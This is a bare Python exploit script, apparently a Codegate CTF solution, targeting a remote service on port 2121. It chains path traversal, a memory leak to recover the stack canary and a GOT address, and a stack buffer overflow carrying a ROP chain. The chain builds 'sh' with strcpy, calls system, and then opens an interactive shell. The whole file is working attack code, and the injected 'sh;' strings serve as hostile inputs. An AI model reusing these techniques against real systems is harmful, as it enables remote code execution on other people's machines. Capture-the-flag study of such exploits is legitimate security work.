import pwnbox, struct,sys
pack = lambda x : struct.pack('<I',x)
unpack = lambda x: struct.unpack('<I',x)[0]

def join(name, age, Id, pw):
    p.read_until(':')
    p.write(pack(1))
    for x in [name, age, Id, pw]:
        p.read_until(':')
        p.write(str(x) +'\n')

def login(Id, pw):
    p.read_until(':')
    p.write(pack(3))
    for x in [Id, pw]:
        p.read_until(':')
        p.write(str(x) +'\n')

def download(url):
    p.read_until(':')
    p.write(pack(5))
    for x in [url]:
        p.read_until(':')
        p.write(str(x) +'\n')

def logout():
    p.read_until(':')
    p.write(pack(4))

def myinfo():
    p.read_until(':')
    p.write(pack(2))

def secret_down(url):
    p.read_until(':')
    p.write(pack(8))
    p.write(pack(1))
    for x in [url]:
        p.read_until(':')
        p.write(str(x) +'\n')
cnt = 0
while True:
    cnt +=1
    p = pwnbox.pipe.SocketPipe('ch41l3ng3s.codegate.kr', 2121, log_to =None)
    join('sh;'*0x20,0x2f,'sh;'*0x20,"sh;"*0x20)
    login('sh;'*0x20,'sh;'*0x20)
    secret_down('/../../')
    p.read_until('\n')
    x = p.read_until('\nChoice')[::-1][7:]
    x = '\x00'+x
    if len(x) %4 != 0:
        x = x + '\x00'*(4-len(x)%4)
    before = None
    canary = None
    got = None
    value = None
    for i in range(len(x)/4):
        before = value
        value = unpack(x[4*i:4*i+4])
        if hex(value).endswith('ef8') :
            canary = before
            got = value
        print hex(value)
    if canary != None:
        base = got - 0x8ef8
        system = base + 0x12a8
        sh = base + 0x807f
        read_adr = base + 0x12c0
        strcpy_adr = base + 0x1300 -1
        buf = base + 0x9180
        schar = base + 0x5790
        hchar = base + 0x7907
        ppr = base + 0x3c4a
        rop = pack(strcpy_adr) + pack(ppr) + pack(buf) + pack(schar)
        rop += pack(strcpy_adr) + pack(ppr) + pack(buf+1) + pack(hchar)
        rop += pack(system) + pack(buf)*2
        login('A'*(0xd4-0xc)+'A'+pack(canary)[1:]+pack(got)*3+rop, 'B'*(0x70-0xc))
        p.interact() 
        sys.exit(0)
    p.close()
